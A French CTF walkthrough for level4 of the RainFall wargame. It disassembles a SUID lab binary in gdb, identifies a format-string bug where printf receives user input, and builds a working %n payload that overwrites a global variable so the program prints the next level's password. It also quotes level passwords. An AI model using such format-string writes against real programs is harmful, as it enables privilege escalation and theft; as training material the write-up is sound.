## 1: Analyse

### A: C'est quoi mon binaire?

  ```shell
  # On se connecte si c'est pas déja fait via le level3
  $ ssh level4@127.0.0.1 -p 4242
        _____       _       ______    _ _
      |  __ \     (_)     |  ____|  | | |
      | |__) |__ _ _ _ __ | |__ __ _| | |
      |  _  /  _` | | '_ \|  __/ _` | | |
      | | \ \ (_| | | | | | | | (_| | | |
      |_|  \_\__,_|_|_| |_|_|  \__,_|_|_|

                    Good luck & Have fun

      To start, ssh with level0/level0 on 10.0.2.15:4242

  # On rentre le password
  level4@127.0.0.1's password: b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
    GCC stack protector support:            Enabled
    Strict user copy checks:                Disabled
    Restrict /dev/mem access:               Enabled
    Restrict /dev/kmem access:              Enabled
    grsecurity / PaX: No GRKERNSEC
    Kernel Heap Hardening: No KERNHEAP
  System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
  RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
  No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level4/level4
  level4@RainFall:~$
  
  # On regarde ce qu'on a
  level4@RainFall:~$ ls -la
    total 17
    dr-xr-x---+ 1 level4 level4   80 Mar  6  2016 .
    dr-x--x--x  1 root   root    340 Sep 23  2015 ..
    -rw-r--r--  1 level4 level4  220 Apr  3  2012 .bash_logout
    -rw-r--r--  1 level4 level4 3530 Sep 23  2015 .bashrc
    -rwsr-s---+ 1 level5 users  5252 Mar  6  2016 level4
    -rw-r--r--+ 1 level4 level4   65 Sep 23  2015 .pass
    -rw-r--r--  1 level4 level4  675 Apr  3  2012 .profile

  # On teste les arguments
  level4@RainFall:~$ ./level4
    asdfasdfasdf
    asdfasdfasdf
  level4@RainFall:~$ ./level4
    STRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUE
    STRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUE
  level4@RainFall:~$ ./level4
    STRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUESTRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUESTRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUESTRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUESTRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUESTRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUESTRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUESTRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUESTRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUESTRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUESTRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUESTRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUESTRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUESTRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUESTRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUESTRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUESTRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUESTRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUESTRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUESTRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUESTRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUESTRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUESTRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUESTRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUESTRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUESTRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUESTRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUESTRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUESTRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUESTRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUESTRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUE
    STRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUESTRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUESTRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUESTRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUESTRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUESTRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUESTRING SUPER LOOOOOOOOOOOOOOOOO
  ```
  * On a un binaire appartenant a level4 dans le home avec les droits SUID...
  * ... qui demande un input ...
  * ... qui print l'input ...
  * ... qui segfault pas ...
  * ... puisqu'il protège l'input: tout l'input n'est pas print. Ouvrons lui le ventre ...


### B: On l'ouvre avec gdb
  * On va dans tmp pour lancer avec peda qu'on a copié avec le setup.sh
  ```shell
    level4@RainFall:~$ cd /tmp
  ```

  * On lance gdb avec notre binaire
  ```shell
    level4@RainFall:/tmp$ gdb ~/level4
      [...]
      Reading symbols from /home/user/level4/level4...(no debugging symbols found)...done.
  ```

  * Qu'est-ce qu'on a comme fonctions?
  ```shell
    gdb-peda$ info function
      All defined functions:

      Non-debugging symbols:
      0x080482f8  _init
      0x08048340  printf
      0x08048340  printf@plt
      0x08048350  fgets
      0x08048350  fgets@plt
      0x08048360  system
      0x08048360  system@plt
      0x08048370  __gmon_start__
      0x08048370  __gmon_start__@plt
      0x08048380  __libc_start_main
      0x08048380  __libc_start_main@plt
      0x08048390  _start
      0x080483c0  __do_global_dtors_aux
      0x08048420  frame_dummy # Func  frame_dummy
      0x08048444  p           # Func  p
      0x08048457  n           # Func  n
      0x080484a7  main        # Func  main
      0x080484c0  __libc_csu_init
      0x08048530  __libc_csu_fini
      0x08048532  __i686.get_pc_thunk.bx
      0x08048540  __do_global_ctors_aux
      0x0804856c  _fini
  ```

  * Commandes lancées pendant l'analyse du binaire ci-dessous
  ```shell
    gdb-peda$ x/s 0x8049804
      0x8049804 <stdin@@GLIBC_2.0>:	 ""

    gdb-peda$ x/s 0x8049810
      0x8049810 <m>:	 ""

    gdb-peda$ x/s 0x8048590
      0x8048590:	 "/bin/cat /home/user/level5/.pass"
  ```

  * On disassemble main pour regarder le code
  ```shell
    gdb-peda$ pdisas main
      Dump of assembler code for function main:
      # Comme dans le level2 et 3, sauf qu'on call n à la place
      0x080484a7 <+0>:	push   ebp
      0x080484a8 <+1>:	mov    ebp,esp
      0x080484aa <+3>:	and    esp,0xfffffff0
      0x080484ad <+6>:	call   0x8048457 <n>
      0x080484b2 <+11>:	leave
      0x080484b3 <+12>:	ret
      End of assembler dump.
  ```

  * Ok, donc on a un main qui call n et return. Regardons n.
  ```shell
    gdb-peda$ pdisas n
      Dump of assembler code for function n:
      # Comme le level3 avec une allocation 536 octets.
      0x08048457 <+0>:	push   ebp
      0x08048458 <+1>:	mov    ebp,esp
      0x0804845a <+3>:	sub    esp,0x218

      # Comme dans le n du level3, Call fgets(buffer[520], 512, stdin)
      0x08048460 <+9>:	mov    eax,ds:0x8049804           # On met stdin dans eax
      0x08048465 <+14>:	mov    DWORD PTR [esp+0x8],eax    # On push eax (stdin) sur la stack
      0x08048469 <+18>:	mov    DWORD PTR [esp+0x4],0x200  # On push 512 sur la stack
      0x08048471 <+26>:	lea    eax,[ebp-0x208]            # On déplace eax sur EBP - 520
      0x08048477 <+32>:	mov    DWORD PTR [esp],eax        # On push eax (EBP - 520) sur la stack
      0x0804847a <+35>:	call   0x8048350 <fgets@plt>      # On call fgets avec ces arguments

      # Comme le level3 mais ce coup ci on appelle la fonction p(buffer[520])
      0x0804847f <+40>:	lea    eax,[ebp-0x208]      # On déplace eax sur le debut de notre buffer[520]
      0x08048485 <+46>:	mov    DWORD PTR [esp],eax  # On push eax (buffer[520]) sur la stack
      0x08048488 <+49>:	call   0x8048444 <p>        # On call p avec notre input

      # If gobale m != 16 930 116 jump to return
      0x0804848d <+54>:	mov    eax,ds:0x8049810     # On met la globale m dans eax
      0x08048492 <+59>:	cmp    eax,0x1025544        # On compare la globale m a 16 930 116
      0x08048497 <+64>:	jne    0x80484a5 <n+78>     # Si m != 16 930 116 jump to n+78 (return)

      # Call system("/bin/cat /home/user/level5/.pass")
      0x08048499 <+66>:	mov    DWORD PTR [esp],0x8048590  # On met "/bin/cat /home/user/level5/.pass" dans esp
      0x080484a0 <+73>:	call   0x8048360 <system@plt>     # On call system avec cette commande

      # Return (jump from n+64 si m n'a pas la bonne valeur)
      0x080484a5 <+78>:	leave
      0x080484a6 <+79>:	ret
      End of assembler dump.
  ```

  * On voit que n prend un input de manière plus sécurisée que gets (avec une taille qui débordera pas sur l'EIP)
  * Il envoie cet input à p
  * Si la globale m est != 16 930 116, return
  * Sinon, on cat directement le .pass du level5.

  * Bon, on sait qu'on doit réussir a changer cette variable m() pour pouvoir cat le password, et on va voir p pour trouver une faille

  ```shell
  gdb-peda$ pdisas p
    Dump of assembler code for function p:
    # Initialisation et allocation de 24 octets
    0x08048444 <+0>:	push   ebp
    0x08048445 <+1>:	mov    ebp,esp
    0x08048447 <+3>:	sub    esp,0x18 # 0x18 = 24

    # Call printf(buffer[520])
    0x0804844a <+6>:	mov    eax,DWORD PTR [ebp+0x8]  # On met le premier argument passé a p (buffer[520]) dans eax
    0x0804844d <+9>:	mov    DWORD PTR [esp],eax      # On push eax (buffer[520]) sur la stack
    0x08048450 <+12>:	call   0x8048340 <printf@plt>   # On call printf avec l'input

    # Return
    0x08048455 <+17>:	leave
    0x08048456 <+18>:	ret
    End of assembler dump.
  ```

  * On voit que p ne fait qu'un printf, comme le faisait la fonction v à l'exercice précédent.
  * La faille est donc la même que celle du level3 mais vu que l'on doit print + de 16M de chars, cela va prendre beaucoup de temps.

## 2: Comportement
> Une fois recomposé, on comprend que le main call juste n.\
> n, quand à elle, la meme chose que v lors du level3 mais call une fonction qui va call printf.

## 3: Exploit

### A: Explication

> cf. level3 ;)

### B: Creation de l'exploit

* Il nous faut donc: l'adresse de m, à partir de combien de parametres on va lire le debut de notre string, et c'est tout

```shell
  # Addresse de m (vu pendant l'analyse)
  gdb-peda$ x/s 0x8049810
    0x8049810 <m>:	 ""

  # On teste au bout de combien de paramètres on retombe sur nos AAAA
  level4@RainFall:/tmp$ echo 'AAAA.%x.%x.%x.%x.%x' | ~/level4
    AAAA.b7ff26b0.bffff734.b7fd0ff4.0.0
  # On voit ici que l'on ne tombe pas sur nos A. Normal, notre format string est plus loin vu que le printf est dans une autre fonction
  level4@RainFall:/tmp$ echo 'AAAA.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x' | ~/level4
    AAAA.b7ff26b0.bffff734.b7fd0ff4.0.0.bffff6f8.804848d.bffff4f0.200.b7fd1ac0.b7ff37d0.41414141.252e7825.78252e78.2e78252e
  # Pouf! 12ème argument
```

* On a donc tous les prérequis. En transformant en little indian l'addresse de m(\x10\x98\x04\x08), on va pouvoir construire la string suivante:

```shell
  level4@RainFall:/tmp$ python -c 'print "\x10\x98\x04\x08%1$16930112d%12$n"' > pattern4
```
* La syntaxe "%12$n" Veut dire qu'on prend le 12eme parametre (évite la répétition de random %)
* La syntaxe "%1$16930112d" veut dire qu'on met un padding de 16930112 avant notre premier parametre
* Donc 16930112 + les 4 de l'addresse, ca nous fait bien 16930116. Et le 12eme paramètre sera l'endroit où l'on stockera ce nombre

```shell
level4@RainFall:/tmp$ cat /tmp/pattern4 - | ~/level4 # ...A few moments later...
  [...]-1208015184
  0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```
